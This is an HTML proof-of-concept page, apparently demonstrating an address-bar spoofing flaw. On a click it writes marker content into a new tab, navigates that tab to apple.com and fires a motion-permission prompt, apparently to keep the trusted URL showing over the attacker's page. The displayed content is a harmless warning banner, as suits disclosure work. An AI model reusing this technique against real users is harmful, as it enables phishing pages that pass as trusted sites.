<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />

    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />

    <title>Spoofing</title>

    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #fff;
      }

      button {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);

        padding: 15px 30px;
        font-size: 18px;

        background: #007aff;
        color: #fff;

        border: none;
        border-radius: 10px;

        cursor: pointer;
      }
    </style>
  </head>

  <body>

    <button id="startBtn">
      CLICK HERE
    </button>


    <script>

      /*
       * ==========================================
       * MOTION PERMISSION
       * ==========================================
       */

      function reqMotion() {

        if (
          typeof DeviceMotionEvent?.requestPermission === "function"
        ) {

          DeviceMotionEvent.requestPermission()

            .then((res) => {

              console.log(
                "Motion permission:",
                res
              );

            })

            .catch((err) => {

              console.log(
                "Motion permission error:",
                err
              );

            });

        } else {

          console.log(
            "Motion API not supported"
          );

        }

      }


      /*
       * ==========================================
       * MAIN BUTTON
       * ==========================================
       */

      document
        .getElementById("startBtn")
        .onclick = function () {

          this.remove();


          /*
           * Open new tab
           */

          const newTab =
            window.open(
              "about:blank",
              "_blank"
            );


          if (newTab) {

            /*
             * Attacker-controlled content
             */

            newTab.document.write(`

              <!DOCTYPE html>

              <html>

              <head>

                <title>
                  testertester
                </title>

              </head>


              <body
                style="
                  margin:0;
                  padding:0;
                  background:#fff;

                  display:flex;

                  align-items:center;
                  justify-content:center;

                  min-height:100vh;

                  text-align:center;
                "
              >

                <div>

                  <h1
                    style="
                      font-size:96px;
                      font-weight:bold;
                      color:red;

                      margin:0 0 30px 0;
                    "
                  >
                    THIS IS NOT APPLE.COM!
                  </h1>


                  <i>

                    <p
                      style="
                        font-size:64px;
                        font-weight:bold;
                        color:#007aff;

                        margin:20px 0;
                      "
                    >
                      *THIS IS AN ATTACKER CONTROLLED PAGE
                    </p>

                  </i>

                </div>

              </body>

              </html>

            `);


            newTab.document.close();


            /*
             * Navigation
             */

            setTimeout(() => {

              newTab.location.href =
                "https://apple.com/";

            }, 1);

          }


          /*
           * Request motion permission
           *
           * IMPORTANT:
           * Keep this inside the click handler
           * so the request remains associated
           * with the user's gesture.
           */

          reqMotion();

        };

    </script>

  </body>
</html>
